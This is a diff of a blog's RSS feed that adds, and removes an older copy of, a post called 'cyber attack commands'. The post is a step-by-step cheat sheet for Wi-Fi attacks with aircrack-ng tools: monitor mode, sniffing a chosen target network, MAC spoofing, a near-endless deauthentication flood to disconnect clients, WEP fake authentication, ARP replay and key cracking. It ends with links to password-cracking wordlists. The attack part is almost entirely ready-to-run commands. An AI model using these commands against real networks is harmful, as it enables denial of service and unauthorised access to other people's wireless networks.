@@ -227,6 +227,219 @@
     </item>
     
     <item>
+      <title>5. cyber attack commands</title>
+      <link>/posts/blog-5-cyber-atk-cmds/</link>
+      <pubDate>Wed, 04 Dec 2024 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/blog-5-cyber-atk-cmds/</guid>
+      <description>&lt;hr&gt;
+&lt;p&gt;&lt;em&gt;note: its my personal research so there can be errors or more fast and powerful method available
+to do same attacks&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;commands-related-to-network-attacks&#34;&gt;Commands Related to Network Attacks:&lt;/h1&gt;
+&lt;h1 id=&#34;packet-sniffing--airodump-ng-monitor-mode-interface&#34;&gt;packet sniffing : airodump-ng [monitor mode interface]&lt;/h1&gt;
+&lt;p&gt;&lt;em&gt;first enable monitor mode; then&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;ifconfig wlan0 down&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;airmon-ng check kill&lt;/code&gt; ( to kill the manager)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;iwconfig wlan0 mode monitor&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;ifconfig wlan0 up&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;iwconfig&lt;/code&gt; ( to check)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;network-preconnection-attacktxt&#34;&gt;network preconnection attack.txt&lt;/h1&gt;
+&lt;p&gt;&lt;em&gt;note: need monitor mode on&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;airodump-ng wlan0 ( discover all wireless network and info around it)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;sniff and discover 5Ghz networks&lt;/em&gt;&lt;/p&gt;</description>
+      <content>&lt;hr&gt;
+&lt;p&gt;&lt;em&gt;note: its my personal research so there can be errors or more fast and powerful method available
+to do same attacks&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;commands-related-to-network-attacks&#34;&gt;Commands Related to Network Attacks:&lt;/h1&gt;
+&lt;h1 id=&#34;packet-sniffing--airodump-ng-monitor-mode-interface&#34;&gt;packet sniffing : airodump-ng [monitor mode interface]&lt;/h1&gt;
+&lt;p&gt;&lt;em&gt;first enable monitor mode; then&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;ifconfig wlan0 down&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;airmon-ng check kill&lt;/code&gt; ( to kill the manager)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;iwconfig wlan0 mode monitor&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;ifconfig wlan0 up&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;iwconfig&lt;/code&gt; ( to check)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;network-preconnection-attacktxt&#34;&gt;network preconnection attack.txt&lt;/h1&gt;
+&lt;p&gt;&lt;em&gt;note: need monitor mode on&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;airodump-ng wlan0 ( discover all wireless network and info around it)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;sniff and discover 5Ghz networks&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;airodump-ng --band a wlan0&lt;/code&gt;  (a = 5Ghz)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;for sniffing multiple bands ( 2.4 &amp;amp; 5)&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;airodump-ng --band abg wlan0&lt;/code&gt;  ( all frequency)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;*to siff only target network **&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;airodump-ng  --bssid XX:XX:XX:XX:XX:XX --channel X --write test wlan0&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;{ &lt;em&gt;&amp;ldquo;channel&amp;rdquo; for airodump-ng to sniff on and &amp;ldquo;write&amp;rdquo; for storing data in file&lt;/em&gt; (xxxx.cap)}&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;wireshark&lt;/code&gt; ( &lt;em&gt;to lauch wireshark or can open manually to check the xxxx.cap file filled with target data&lt;/em&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;change-your-mac-adresss&#34;&gt;change your mac adresss:&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;ifconfig wlan0 down&lt;/code&gt; (to make wlan0 down)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;ifconfig wlan0 hw ether XX:XX:XX:XX:XX:XX&lt;/code&gt; ( &lt;em&gt;random mac address&lt;/em&gt;)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;ifconfig wlan0 up&lt;/code&gt; (&lt;em&gt;to make wlan0 up again&lt;/em&gt;)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;ifconfig&lt;/code&gt; ( *to check *)
+``&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;deauthentication-attack--disconnect-any-client-form-any-network&#34;&gt;deauthentication attack ( disconnect any client form any network)&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;aireplay-ng --deauth [deauth Pacekts] -a [Network Mac add] -c [Target Mac add]  [Interface]&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;run airodump-ng in parallel terminal against the target network&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;airodump-ng  --bssid XX:XX:XX:XX:XX:XX --channel X wlan0&lt;/code&gt; (&lt;em&gt;no need of &amp;ndash;write if u dont want file&lt;/em&gt;)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;aireplay-ng --deauth 100000000 -a XX:XX:XX:XX:XX:XX -c XX:XX:XX:XX:XX:XX  -D wlan0&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;{ &lt;em&gt;100000000 give max packets to deauth for long time; &amp;ldquo;-D&amp;rdquo; if client is on 5Ghz network
+and if its in 2.4Ghz then remove the &amp;ldquo;-D&amp;rdquo;&lt;/em&gt;}&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;if client still has access to other networks then split the terminal and run same attack parallel on that network&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;fake-authentication-attack-wep&#34;&gt;Fake authentication attack (wep)&lt;/h1&gt;
+&lt;p&gt;&lt;em&gt;forcing AP to generate new packets with new IVs&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;aireplay-ng --fakeauth 0 -a [network Mac add] -h[our Mac add] wlan0&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;airodump-ng --bssid XX:XX:XX:XX:XX:XX --channel x --write xxxx wlan0&lt;/code&gt;
+(&lt;em&gt;sniffing target network with storing data and running parallely&lt;/em&gt;)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;aireplay-ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0&lt;/code&gt;
+(&lt;em&gt;0 for doing fake authentication attack once&lt;/em&gt; )&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;running arpreplay attack&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;aireplay-ng --arpreplay -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;associate data 1 more time&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;aireplay-ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;aircrack-ng xxxx.cap&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;gainning-access-wep-cracking&#34;&gt;Gainning access (wep cracking)&lt;/h1&gt;
+&lt;p&gt;&lt;em&gt;needs to capture large no. of packets
+iv is too small(24 bits)
+iv is sent in plain text&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;to capture large no. of packets/IVs&lt;/em&gt;    &amp;mdash;&amp;gt;   using airodump-ng
+&lt;em&gt;to analyse the captured packets/IVs and crack the key&lt;/em&gt; &amp;mdash;-&amp;gt; using aircrack-ng&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;step1:&lt;/strong&gt;
+*wireless adapter in monitor mode&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;airodump-ng wlan0&lt;/code&gt; (  &lt;em&gt;discover all wireless network and info around it in parallel terminal&lt;/em&gt;)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;airodump-ng  --bssid XX:XX:XX:XX:XX:XX --channel X --write test wlan0&lt;/code&gt;&lt;br&gt;
+( &lt;em&gt;to capture packets of specefic target network and &amp;ldquo;&amp;ndash;write&amp;rdquo; to sotred data in file&lt;/em&gt;)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;step2:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;aircrack-ng xxxx.cap&lt;/code&gt; (xxxx.cap = file name)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;will get key and ascii password, can connect through both and for key remove the colon&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;wpawpa2-cracking&#34;&gt;wpa/wpa2 cracking&lt;/h1&gt;
+&lt;p&gt;*both can be cracked using the same methods&lt;/p&gt;
+&lt;p&gt;made to adress the issues in wep&lt;/p&gt;
+&lt;p&gt;much more secure&lt;/p&gt;
+&lt;p&gt;each packet is encrypted using a unique temporary key&lt;/p&gt;
+&lt;p&gt;packet contains no useful information*&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;some-links-to-wordlists&#34;&gt;some-Links-To-wordlists&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;Openwall Wordlists&lt;/strong&gt;&lt;br&gt;
+Use: Offers a variety of password cracking wordlists for security testing and penetration testing.
+&lt;a href=&#34;ftp://ftp.openwall.com/pub/wordlists/&#34;&gt;ftp://ftp.openwall.com/pub/wordlists/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Openwall Mirrors&lt;/strong&gt;&lt;br&gt;
+Use: Mirror site for Openwall’s tools, providing easy access to its resources, including wordlists.
+&lt;a href=&#34;http://www.openwall.com/mirrors/&#34;&gt;http://www.openwall.com/mirrors/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;SecLists on GitHub&lt;/strong&gt;&lt;br&gt;
+Use: A collection of security-related wordlists for various penetration testing needs, like password cracking and directory brute forcing.
+&lt;a href=&#34;https://github.com/danielmiessler/SecLists&#34;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Outpost9 Wordlists&lt;/strong&gt;&lt;br&gt;
+Use: Provides password wordlists for cracking and penetration testing.
+&lt;a href=&#34;http://www.outpost9.com/files/WordLists.html&#34;&gt;http://www.outpost9.com/files/WordLists.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Vulnerability Assessment Passwords&lt;/strong&gt;&lt;br&gt;
+Use: Offers password wordlists for vulnerability assessments and security testing.
+&lt;a href=&#34;http://www.vulnerabilityassessment.co.uk/passwords.htm&#34;&gt;http://www.vulnerabilityassessment.co.uk/passwords.htm&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Packet Storm Wordlists&lt;/strong&gt;&lt;br&gt;
+Use: A trusted resource offering various wordlists for security professionals, particularly for cracking passwords.
+&lt;a href=&#34;http://packetstormsecurity.org/Crackers/wordlists/&#34;&gt;http://packetstormsecurity.org/Crackers/wordlists/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Moby Wordlists&lt;/strong&gt;&lt;br&gt;
+Use: Large collections of English wordlists used in password cracking and natural language processing tasks.
+&lt;a href=&#34;http://www.ai.uga.edu/ftplib/natural-language/moby/&#34;&gt;http://www.ai.uga.edu/ftplib/natural-language/moby/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Cotse Wordlists 1&lt;/strong&gt;&lt;br&gt;
+Use: Provides wordlists for security testing, including common passwords and user names.
+&lt;a href=&#34;http://www.cotse.com/tools/wordlists1.htm&#34;&gt;http://www.cotse.com/tools/wordlists1.htm&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Cotse Wordlists 2&lt;/strong&gt;&lt;br&gt;
+Use: Additional wordlists for password cracking and penetration testing.
+&lt;a href=&#34;http://www.cotse.com/tools/wordlists2.htm&#34;&gt;http://www.cotse.com/tools/wordlists2.htm&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Wordlist Project&lt;/strong&gt;&lt;br&gt;
+Use: A SourceForge project offering a variety of wordlists for password cracking and security testing.
+&lt;a href=&#34;http://wordlist.sourceforge.net/&#34;&gt;http://wordlist.sourceforge.net/&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;[Crusveder]&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
       <title>1. My Awesome First Blog</title>
       <link>/posts/blog-1-first-blog/</link>
       <pubDate>Mon, 02 Dec 2024 00:00:00 +0000</pubDate>
@@ -610,219 +823,6 @@ Password reuse is like leaving your front door key under the mat—it’s an ope
 &lt;p&gt;&lt;strong&gt;Use&lt;/strong&gt;: Man-in-the-middle attacks. Ettercap is used for intercepting and manipulating network traffic in real-time during MITM (Man-in-the-Middle) attacks. It supports features like DNS spoofing and ARP poisoning to redirect or intercept communication.&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;These tools are commonly used by CEH professionals to perform a wide range of ethical hacking tasks, from reconnaissance and vulnerability scanning to penetration testing and exploitation. Knowing how to use them effectively is a critical part of the CEH certification and ethical hacking in general.&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;[Crusveder]&lt;/p&gt;
-</content>
-    </item>
-    
-    <item>
-      <title>5. cyber attack commands</title>
-      <link>/posts/blog-5-cyber-atk-cmds/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/posts/blog-5-cyber-atk-cmds/</guid>
-      <description>&lt;hr&gt;
-&lt;p&gt;&lt;em&gt;note: its my personal research so there can be errors or more fast and powerful method available
-to do same attacks&lt;/em&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;h1 id=&#34;commands-related-to-network-attacks&#34;&gt;Commands Related to Network Attacks:&lt;/h1&gt;
-&lt;h1 id=&#34;packet-sniffing--airodump-ng-monitor-mode-interface&#34;&gt;packet sniffing : airodump-ng [monitor mode interface]&lt;/h1&gt;
-&lt;p&gt;&lt;em&gt;first enable monitor mode; then&lt;/em&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;ifconfig wlan0 down&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;airmon-ng check kill&lt;/code&gt; ( to kill the manager)&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;iwconfig wlan0 mode monitor&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;ifconfig wlan0 up&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;iwconfig&lt;/code&gt; ( to check)&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
-&lt;h1 id=&#34;network-preconnection-attacktxt&#34;&gt;network preconnection attack.txt&lt;/h1&gt;
-&lt;p&gt;&lt;em&gt;note: need monitor mode on&lt;/em&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;airodump-ng wlan0 ( discover all wireless network and info around it)&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;em&gt;sniff and discover 5Ghz networks&lt;/em&gt;&lt;/p&gt;</description>
-      <content>&lt;hr&gt;
-&lt;p&gt;&lt;em&gt;note: its my personal research so there can be errors or more fast and powerful method available
-to do same attacks&lt;/em&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;h1 id=&#34;commands-related-to-network-attacks&#34;&gt;Commands Related to Network Attacks:&lt;/h1&gt;
-&lt;h1 id=&#34;packet-sniffing--airodump-ng-monitor-mode-interface&#34;&gt;packet sniffing : airodump-ng [monitor mode interface]&lt;/h1&gt;
-&lt;p&gt;&lt;em&gt;first enable monitor mode; then&lt;/em&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;ifconfig wlan0 down&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;airmon-ng check kill&lt;/code&gt; ( to kill the manager)&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;iwconfig wlan0 mode monitor&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;ifconfig wlan0 up&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;iwconfig&lt;/code&gt; ( to check)&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
-&lt;h1 id=&#34;network-preconnection-attacktxt&#34;&gt;network preconnection attack.txt&lt;/h1&gt;
-&lt;p&gt;&lt;em&gt;note: need monitor mode on&lt;/em&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;airodump-ng wlan0 ( discover all wireless network and info around it)&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;em&gt;sniff and discover 5Ghz networks&lt;/em&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;airodump-ng --band a wlan0&lt;/code&gt;  (a = 5Ghz)&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;em&gt;for sniffing multiple bands ( 2.4 &amp;amp; 5)&lt;/em&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;airodump-ng --band abg wlan0&lt;/code&gt;  ( all frequency)&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;*to siff only target network **&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;airodump-ng  --bssid XX:XX:XX:XX:XX:XX --channel X --write test wlan0&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;{ &lt;em&gt;&amp;ldquo;channel&amp;rdquo; for airodump-ng to sniff on and &amp;ldquo;write&amp;rdquo; for storing data in file&lt;/em&gt; (xxxx.cap)}&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;wireshark&lt;/code&gt; ( &lt;em&gt;to lauch wireshark or can open manually to check the xxxx.cap file filled with target data&lt;/em&gt;)&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
-&lt;h1 id=&#34;change-your-mac-adresss&#34;&gt;change your mac adresss:&lt;/h1&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;ifconfig wlan0 down&lt;/code&gt; (to make wlan0 down)&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;ifconfig wlan0 hw ether XX:XX:XX:XX:XX:XX&lt;/code&gt; ( &lt;em&gt;random mac address&lt;/em&gt;)&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;ifconfig wlan0 up&lt;/code&gt; (&lt;em&gt;to make wlan0 up again&lt;/em&gt;)&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;ifconfig&lt;/code&gt; ( *to check *)
-``&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
-&lt;h1 id=&#34;deauthentication-attack--disconnect-any-client-form-any-network&#34;&gt;deauthentication attack ( disconnect any client form any network)&lt;/h1&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;aireplay-ng --deauth [deauth Pacekts] -a [Network Mac add] -c [Target Mac add]  [Interface]&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;em&gt;run airodump-ng in parallel terminal against the target network&lt;/em&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;airodump-ng  --bssid XX:XX:XX:XX:XX:XX --channel X wlan0&lt;/code&gt; (&lt;em&gt;no need of &amp;ndash;write if u dont want file&lt;/em&gt;)&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;aireplay-ng --deauth 100000000 -a XX:XX:XX:XX:XX:XX -c XX:XX:XX:XX:XX:XX  -D wlan0&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;{ &lt;em&gt;100000000 give max packets to deauth for long time; &amp;ldquo;-D&amp;rdquo; if client is on 5Ghz network
-and if its in 2.4Ghz then remove the &amp;ldquo;-D&amp;rdquo;&lt;/em&gt;}&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;if client still has access to other networks then split the terminal and run same attack parallel on that network&lt;/em&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;h1 id=&#34;fake-authentication-attack-wep&#34;&gt;Fake authentication attack (wep)&lt;/h1&gt;
-&lt;p&gt;&lt;em&gt;forcing AP to generate new packets with new IVs&lt;/em&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;aireplay-ng --fakeauth 0 -a [network Mac add] -h[our Mac add] wlan0&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;airodump-ng --bssid XX:XX:XX:XX:XX:XX --channel x --write xxxx wlan0&lt;/code&gt;
-(&lt;em&gt;sniffing target network with storing data and running parallely&lt;/em&gt;)&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;aireplay-ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0&lt;/code&gt;
-(&lt;em&gt;0 for doing fake authentication attack once&lt;/em&gt; )&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;em&gt;running arpreplay attack&lt;/em&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;aireplay-ng --arpreplay -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;em&gt;associate data 1 more time&lt;/em&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;aireplay-ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;aircrack-ng xxxx.cap&lt;/code&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
-&lt;h1 id=&#34;gainning-access-wep-cracking&#34;&gt;Gainning access (wep cracking)&lt;/h1&gt;
-&lt;p&gt;&lt;em&gt;needs to capture large no. of packets
-iv is too small(24 bits)
-iv is sent in plain text&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;to capture large no. of packets/IVs&lt;/em&gt;    &amp;mdash;&amp;gt;   using airodump-ng
-&lt;em&gt;to analyse the captured packets/IVs and crack the key&lt;/em&gt; &amp;mdash;-&amp;gt; using aircrack-ng&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;step1:&lt;/strong&gt;
-*wireless adapter in monitor mode&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;airodump-ng wlan0&lt;/code&gt; (  &lt;em&gt;discover all wireless network and info around it in parallel terminal&lt;/em&gt;)&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;airodump-ng  --bssid XX:XX:XX:XX:XX:XX --channel X --write test wlan0&lt;/code&gt;&lt;br&gt;
-( &lt;em&gt;to capture packets of specefic target network and &amp;ldquo;&amp;ndash;write&amp;rdquo; to sotred data in file&lt;/em&gt;)&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;strong&gt;step2:&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;aircrack-ng xxxx.cap&lt;/code&gt; (xxxx.cap = file name)&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;em&gt;will get key and ascii password, can connect through both and for key remove the colon&lt;/em&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;h1 id=&#34;wpawpa2-cracking&#34;&gt;wpa/wpa2 cracking&lt;/h1&gt;
-&lt;p&gt;*both can be cracked using the same methods&lt;/p&gt;
-&lt;p&gt;made to adress the issues in wep&lt;/p&gt;
-&lt;p&gt;much more secure&lt;/p&gt;
-&lt;p&gt;each packet is encrypted using a unique temporary key&lt;/p&gt;
-&lt;p&gt;packet contains no useful information*&lt;/p&gt;
-&lt;hr&gt;
-&lt;h1 id=&#34;some-links-to-wordlists&#34;&gt;some-Links-To-wordlists&lt;/h1&gt;
-&lt;p&gt;&lt;strong&gt;Openwall Wordlists&lt;/strong&gt;&lt;br&gt;
-Use: Offers a variety of password cracking wordlists for security testing and penetration testing.
-&lt;a href=&#34;ftp://ftp.openwall.com/pub/wordlists/&#34;&gt;ftp://ftp.openwall.com/pub/wordlists/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Openwall Mirrors&lt;/strong&gt;&lt;br&gt;
-Use: Mirror site for Openwall’s tools, providing easy access to its resources, including wordlists.
-&lt;a href=&#34;http://www.openwall.com/mirrors/&#34;&gt;http://www.openwall.com/mirrors/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;SecLists on GitHub&lt;/strong&gt;&lt;br&gt;
-Use: A collection of security-related wordlists for various penetration testing needs, like password cracking and directory brute forcing.
-&lt;a href=&#34;https://github.com/danielmiessler/SecLists&#34;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Outpost9 Wordlists&lt;/strong&gt;&lt;br&gt;
-Use: Provides password wordlists for cracking and penetration testing.
-&lt;a href=&#34;http://www.outpost9.com/files/WordLists.html&#34;&gt;http://www.outpost9.com/files/WordLists.html&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Vulnerability Assessment Passwords&lt;/strong&gt;&lt;br&gt;
-Use: Offers password wordlists for vulnerability assessments and security testing.
-&lt;a href=&#34;http://www.vulnerabilityassessment.co.uk/passwords.htm&#34;&gt;http://www.vulnerabilityassessment.co.uk/passwords.htm&lt;/a&gt;&lt;/p&gt;
